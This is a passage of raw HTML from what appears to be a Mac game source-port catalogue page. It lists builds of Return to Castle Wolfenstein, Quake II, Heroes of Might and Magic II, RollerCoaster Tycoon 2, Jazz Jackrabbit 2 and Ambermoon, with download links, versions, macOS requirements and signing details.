}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Signed</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Notarized</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Mac Source Ports Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/MacSourcePorts/MSPBuildSystem/releases/download/iortcw_1.51c_2025-10-01/iowolfsp-1.51.c.dmg">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 1.51c</span></p><!--bindings={
  "ng-reflect-ng-if": "1.51c"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.9 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.9"
}--></div><p>Build date: October 1, 2025</p></div></build-info><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><!--bindings={
  "ng-reflect-ng-if": "false"
}--><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_1_icon.png" width="20px">&nbsp; Universal 1 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 32-bit or 64-bit Intel processors. Manufactured from 2005-2023." ng-reflect-ngb-tooltip="Macs with 32-bit or 64-bit Int">Intel</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with PowerPC processors. Manufactured from 1994-2005." ng-reflect-ngb-tooltip="Macs with PowerPC processors. ">PowerPC</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/iortcw/iortcw/releases/download/1.51c/iortcw-1.51c-mac-ub.zip">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 1.51c</span></p><!--bindings={
  "ng-reflect-ng-if": "1.51c"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.5 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.5"
}--></div><p>Build date: March 16, 2019</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object],[object Object"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Signed</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Notarized</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Mac Source Ports Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/MacSourcePorts/MSPBuildSystem/releases/download/iortcw_1.51c_2025-10-01/iowolfmp-1.51.c.dmg">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 1.51c</span></p><!--bindings={
  "ng-reflect-ng-if": "1.51c"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.9 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.9"
}--></div><p>Build date: October 1, 2025</p></div></build-info><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><!--bindings={
  "ng-reflect-ng-if": "false"
}--><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_1_icon.png" width="20px">&nbsp; Universal 1 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 32-bit or 64-bit Intel processors. Manufactured from 2005-2023." ng-reflect-ngb-tooltip="Macs with 32-bit or 64-bit Int">Intel</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with PowerPC processors. Manufactured from 1994-2005." ng-reflect-ngb-tooltip="Macs with PowerPC processors. ">PowerPC</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/iortcw/iortcw/releases/download/1.51c/iortcw-1.51c-mac-ub.zip">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 1.51c</span></p><!--bindings={
  "ng-reflect-ng-if": "1.51c"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.5 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.5"
}--></div><p>Build date: March 16, 2019</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object],[object Object"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object],[object Object"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;id Software<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;December 9, 1997<br _ngcontent-qyv-c32=""><span _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Source Code Release Date:</strong>&nbsp;December 22, 2001</span><!--bindings={
  "ng-reflect-ng-if": "December 22, 2001"
}--></p><p _ngcontent-qyv-c32=""><em>Quake II</em> is a first-person shooter, the second in the <em>Quake</em> series. Yamagi Quake2 is the most mature and advanced port actively being maintained.</p><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/quake_"
}--><!--bindings={
  "ng-reflect-ng-if": "https://humblebundleinc.sjv.io"
}--><div _ngcontent-qyv-c32=""><p><span _ngcontent-qyv-c32="">Purchasing a game through one of our links helps support the site.&nbsp;&nbsp;<span _ngcontent-qyv-c32="">You can use our <a _ngcontent-qyv-c32="" href="https://macsourceports.com/utility/extractor"><i _ngcontent-qyv-c32="">Extractor</i></a> utility to get the data from the GOG game installer.</span><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/quake_"
}--></span></p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/quake_"
}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/quake2_ss1.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Signed</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Notarized</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Mac Source Ports Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/MacSourcePorts/MSPBuildSystem/releases/download/yquake2_8.60/yquake2-8.60.dmg">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 8.60</span></p><!--bindings={
  "ng-reflect-ng-if": "8.60"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.7 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.7"
}--></div><p>Build date: September 15, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;New World Computing<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;October 1, 1996<br _ngcontent-qyv-c32=""><!--bindings={}--></p><p _ngcontent-qyv-c32=""><em>Heroes of Might and Magic II</em> is a 4X turn-based strategy game. Ranked once by PC Gamer as the sixth-best game of all time it features resource building, new factions, skills, and a single-player campaign.</p><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/heroes"
}--><!--bindings={}--><div _ngcontent-qyv-c32=""><p><span _ngcontent-qyv-c32="">Purchasing a game through one of our links helps support the site.&nbsp;&nbsp;<span _ngcontent-qyv-c32="">You can use our <a _ngcontent-qyv-c32="" href="https://macsourceports.com/utility/extractor"><i _ngcontent-qyv-c32="">Extractor</i></a> utility to get the data from the GOG game installer.</span><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/heroes"
}--></span></p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/heroes"
}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/homm2_ss1.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Signed</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Notarized</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Mac Source Ports Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/MacSourcePorts/MSPBuildSystem/releases/download/fheroes2_1.1.11/fheroes2-1.1.11.dmg">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 1.1.11</span></p><!--bindings={
  "ng-reflect-ng-if": "1.1.11"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.15 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.15"
}--></div><p>Build date: September 14, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Chris Sawyer<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;October 15, 2002<br _ngcontent-qyv-c32=""><!--bindings={}--></p><p _ngcontent-qyv-c32="">Another game from the mind of Chris Sawyer, <em>RollerCoaster Tycoon 2</em> shares the same pixel art style and hardcore interface as his other games.</p><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/roller"
}--><!--bindings={
  "ng-reflect-ng-if": "https://humblebundleinc.sjv.io"
}--><div _ngcontent-qyv-c32=""><p><span _ngcontent-qyv-c32="">Purchasing a game through one of our links helps support the site.&nbsp;&nbsp;<span _ngcontent-qyv-c32="">You can use our <a _ngcontent-qyv-c32="" href="https://macsourceports.com/utility/extractor"><i _ngcontent-qyv-c32="">Extractor</i></a> utility to get the data from the GOG game installer.</span><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/roller"
}--></span></p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/roller"
}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/rct2_ss1.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Ad Hoc Signed </p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/OpenRCT2/OpenRCT2/releases/download/v0.4.26/OpenRCT2-v0.4.26-macos-universal.zip">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version v0.4.26</span></p><!--bindings={
  "ng-reflect-ng-if": "v0.4.26"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.14 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.14"
}--></div><p>Build date: September 6, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Epic MegaGames<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;May 7, 1998<br _ngcontent-qyv-c32=""><!--bindings={}--></p><div _ngcontent-qyv-c32=""><p>Although never as big as Mario or Sonic, Jazz Jackrabbit did well enough with a hungry PC gaming crowd to merit a second game in the series. It's your standard shareware sequel story: more levels, more twists, better technology. If you liked the original you'll like this one.</p><p>It also has a very confusing release strategy. The original game was shareware, when you bought it you got the full <em>Jazz Jackrabbit 2</em> game. Later, it was re-released with an additional episode under the title <em>Jazz Jackrabbit 2: The Secret Files</em>. Then came a release called <em>Jazz Jackrabbit 2: The Christmas Chronicles</em>, which adds Christmas-themed levels. So when you get the game on GOG you might spot two entries, neither of which look like they're the base game, but both should work in Jazz² Resurrection.</p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/jazz_j"
}--><!--bindings={
  "ng-reflect-ng-if": ""
}--><div _ngcontent-qyv-c32=""><p><span _ngcontent-qyv-c32="">Purchasing a game through one of our links helps support the site.&nbsp;&nbsp;<span _ngcontent-qyv-c32="">You can use our <a _ngcontent-qyv-c32="" href="https://macsourceports.com/utility/extractor"><i _ngcontent-qyv-c32="">Extractor</i></a> utility to get the data from the GOG game installer.</span><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/jazz_j"
}--></span></p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/jazz_j"
}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/jazzjackrabbit2_ss1.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Ad Hoc Signed </p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/deathkiller/jazz2/releases/download/3.4.0/Jazz2_3.4.0_MacOS.zip">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 3.4.0</span></p><!--bindings={
  "ng-reflect-ng-if": "3.4.0"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 14.0 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "14.0"
}--></div><p>Build date: August 23, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Thalion Software<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;April 11, 1993<br _ngcontent-qyv-c32=""><span _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Source Code Release Date:</strong>&nbsp;May 7, 2023</span><!--bindings={
  "ng-reflect-ng-if": "May 7, 2023"
}--></p><div _ngcontent-qyv-c32=""><p>The Commodore Amiga was one of those computers where it jumped ahead of the competition by several miles, but then stayed there for a long time and got surpassed by the competition. I think this is why there's such a distinctive look to the games the platform and why it was so accessible to smaller game designers, the types we'd call "indie" today.</p><p><i>Ambermoon</i> is an RPG for the Amiga that really looks like an Amiga game. It was the second part of an unfinished trilogy. Although the <a href="https://github.com/jhorneman/ambermoon" target="_new">original game's source</a> has been released, the source port we're pointing to is <em>Ambermoon.net</em> which like it sounds is a recreation of the original game in C#/.NET (the original game was Amiga-specific Assembly language and isn't a great candidate for portability).</p><p>In addition to being able to download it below from the developer's GitHub page, the game is also available on <a href="https://pyrdacor.itch.io/ambermoon" target="_new">itch.io</a> as a "Name your own price" download in case you want to support or tip the developer.</p></div><!--bindings={
  "ng-reflect-ng-if": ""
}--><!--bindings={
  "ng-reflect-ng-if": ""
}--><!--bindings={
  "ng-reflect-ng-if": ""
}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/ambermoon_ss1.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/icon_apple.png" width="20px">&nbsp; Build for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> Macs. </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Full Game</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Ad Hoc Signed </p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/Pyrdacor/Ambermoon.net/releases/download/v1.11.4/Ambermoon.net-Mac-ARM.zip">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version v1.11.4</span></p><!--bindings={
  "ng-reflect-ng-if": "v1.11.4"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 11 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "11"
}--></div><p>Build date: August 30, 2025</p></div></build-info><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
